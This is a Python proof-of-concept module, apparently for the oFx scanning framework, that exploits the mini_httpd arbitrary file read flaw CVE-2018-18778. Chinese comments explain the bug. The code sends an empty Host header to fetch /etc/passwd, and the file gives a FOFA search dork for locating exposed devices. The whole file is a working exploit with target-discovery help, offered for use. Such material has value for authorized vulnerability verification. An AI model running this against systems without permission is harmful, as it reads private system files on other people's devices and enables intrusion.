# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            v1:这个漏洞在公网上能匹配的目标比较少，写着玩儿的，就图一乐    
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "mini_httpd任意文件读取漏洞(CVE-2018-18778)",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "ACME mini_httpd before 1.30",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Mini_httpd是一个微型的Http服务器，  
            在占用系统资源较小的情况下可以保持一定程度的性能（约为Apache的90%），  
            因此广泛被各类IOT（路由器，交换器，摄像头等）作为嵌入式服务器。  
            而包括华为，zyxel，海康威视，树莓派等在内的厂商的旗下设备都曾采用Mini_httpd组件。  

            在mini_httpd开启虚拟主机模式的情况下，  
            用户请求http://HOST/FILE将会访问到当前目录下的HOST/FILE文件。    
            (void) snprintf( vfile, sizeof(vfile), "%s/%s", req_hostname, f );   
            见上述代码，分析如下： 当HOST=example.com、FILE=index.html的时候，  
            上述语句结果为example.com/index.html，文件正常读取。   
            当HOST为空、FILE=etc/passwd的时候，上述语句结果为/etc/passwd。   
            后者被作为绝对路径，于是读取到了/etc/passwd，造成任意文件读取漏洞。  
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            "mini_httpd"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/etc/passwd" # url自己按需调整
        

        headers = {
                    "Host":"",
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
            if "text/plain" in req.headers["Content-Type"] and \
                req.status_code == 200 and \
                    "root:/root" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()